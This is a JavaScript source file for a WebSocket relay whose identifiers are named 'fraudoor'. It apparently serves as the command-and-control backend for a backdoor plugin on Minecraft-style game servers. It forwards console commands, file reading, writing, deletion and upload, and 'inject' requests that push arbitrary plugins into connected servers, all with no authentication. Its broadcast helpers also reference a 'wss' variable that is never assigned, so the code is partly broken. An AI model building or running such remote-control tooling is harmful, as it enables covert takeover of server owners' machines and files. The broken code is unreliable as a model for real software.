import { v4 as uuidv4 } from 'uuid';

let _store = null;

export function getStore() {
  return _store;
}

export function setupWebSocket(wss, store) {
  _store = store;

  wss.on('connection', (ws, req) => {
    const id = uuidv4();
    ws._fraudoorId = id;
    ws._fraudoorRole = null;

    ws.on('message', (raw) => {
      let msg;
      try {
        msg = JSON.parse(raw.toString());
      } catch {
        return;
      }

      const { type, payload } = msg;

      switch (type) {
        // --- Plugin auth ---
        case 'plugin:hello': {
          ws._fraudoorRole = 'plugin';
          ws._fraudoorServerId = payload.id;
          store.addOrUpdateServer(payload.id, {
            ...payload,
            ws,
            online: true,
          });
          broadcastPanel({
            type: 'server:status',
            payload: {
              id: payload.id,
              name: payload.name,
              ip: payload.ip,
              port: payload.port,
              online: true,
              playerCount: payload.playerCount || 0,
              maxPlayers: payload.maxPlayers || 0,
              version: payload.version || '',
              type: payload.type || 'paper',
            },
          });
          break;
        }

        // --- Console output from plugin ---
        case 'plugin:console': {
          const server = store.getServerByWs(ws);
          if (!server) return;
          broadcastPanelForServer(server.id, {
            type: 'server:console',
            payload: {
              serverId: server.id,
              line: payload.line,
              timestamp: Date.now(),
            },
          });
          break;
        }

        // --- Plugin status update ---
        case 'plugin:status': {
          const server = store.getServerByWs(ws);
          if (!server) return;
          store.addOrUpdateServer(server.id, payload);
          broadcastPanelForServer(server.id, {
            type: 'server:status',
            payload: { id: server.id, ...payload },
          });
          break;
        }

        // --- Plugin file listing response ---
        case 'plugin:file:list': {
          const panelWs = findPanelForRequest(payload.requestId);
          if (panelWs) {
            panelWs.send(JSON.stringify({
              type: 'server:file:list',
              payload: payload,
            }));
          }
          break;
        }

        // --- Plugin file read response ---
        case 'plugin:file:read': {
          const panelWs = findPanelForRequest(payload.requestId);
          if (panelWs) {
            panelWs.send(JSON.stringify({
              type: 'server:file:read',
              payload: payload,
            }));
          }
          break;
        }

        case 'plugin:file:write': {
          const panelWs = findPanelForRequest(payload.requestId);
          if (panelWs) {
            panelWs.send(JSON.stringify({
              type: 'server:file:write',
              payload: payload,
            }));
          }
          break;
        }

        case 'plugin:file:delete': {
          const panelWs = findPanelForRequest(payload.requestId);
          if (panelWs) {
            panelWs.send(JSON.stringify({
              type: 'server:file:delete',
              payload: payload,
            }));
          }
          break;
        }

        // --- Panel subscribes ---
        case 'panel:subscribe': {
          ws._fraudoorRole = 'panel';
          ws._fraudoorSubscribedServer = payload.serverId;
          ws.send(JSON.stringify({
            type: 'panel:subscribed',
            payload: { serverId: payload.serverId },
          }));
          break;
        }

        // --- Panel unsubscribes ---
        case 'panel:unsubscribe': {
          ws._fraudoorRole = 'panel';
          ws._fraudoorSubscribedServer = null;
          break;
        }

        // --- Panel sends command to server ---
        case 'panel:command': {
          const server = store.getServer(payload.serverId);
          if (!server || !server.ws) {
            ws.send(JSON.stringify({
              type: 'panel:error',
              payload: { message: 'Server not connected' },
            }));
            return;
          }
          server.ws.send(JSON.stringify({
            type: 'server:command',
            payload: { command: payload.command },
          }));
          break;
        }

        // --- Panel file operations ---
        case 'panel:file:list':
        case 'panel:file:read':
        case 'panel:file:write':
        case 'panel:file:delete':
        case 'panel:file:upload': {
          const server = store.getServer(payload.serverId);
          if (!server || !server.ws) {
            ws.send(JSON.stringify({
              type: 'panel:error',
              payload: { message: 'Server not connected' },
            }));
            return;
          }
          const requestId = uuidv4();
          ws._lastRequestId = requestId;
          server.ws.send(JSON.stringify({
            type: type.replace('panel:', 'server:'),
            payload: { ...payload, requestId },
          }));
          break;
        }

        // --- Injection request relay ---
        case 'panel:inject': {
          const server = store.getServer(payload.serverId);
          if (!server || !server.ws) {
            ws.send(JSON.stringify({
              type: 'panel:error',
              payload: { message: 'Server not connected for injection' },
            }));
            return;
          }
          const requestId = uuidv4();
          ws._lastRequestId = requestId;
          server.ws.send(JSON.stringify({
            type: 'server:inject',
            payload: {
              requestId,
              pluginName: payload.pluginName,
              pluginData: payload.pluginData,
              target: payload.target,
            },
          }));
          break;
        }

        default:
          break;
      }
    });

    ws.on('close', () => {
      if (ws._fraudoorRole === 'plugin' && ws._fraudoorServerId) {
        const server = store.getServer(ws._fraudoorServerId);
        if (server) {
          store.addOrUpdateServer(ws._fraudoorServerId, { online: false, ws: null });
          broadcastPanel({
            type: 'server:status',
            payload: { id: ws._fraudoorServerId, online: false },
          });
        }
      }
    });

    ws.on('error', () => {});
  });
}

function broadcastPanel(msg) {
  wss.clients.forEach((client) => {
    if (client._fraudoorRole === 'panel' && client.readyState === 1) {
      client.send(JSON.stringify(msg));
    }
  });
}

function broadcastPanelForServer(serverId, msg) {
  wss.clients.forEach((client) => {
    if (
      client._fraudoorRole === 'panel' &&
      client.readyState === 1 &&
      (!client._fraudoorSubscribedServer || client._fraudoorSubscribedServer === serverId)
    ) {
      client.send(JSON.stringify(msg));
    }
  });
}

function findPanelForRequest(requestId) {
  for (const client of wss.clients) {
    if (client._fraudoorRole === 'panel' && client._lastRequestId === requestId && client.readyState === 1) {
      return client;
    }
  }
  return null;
}

let wss;
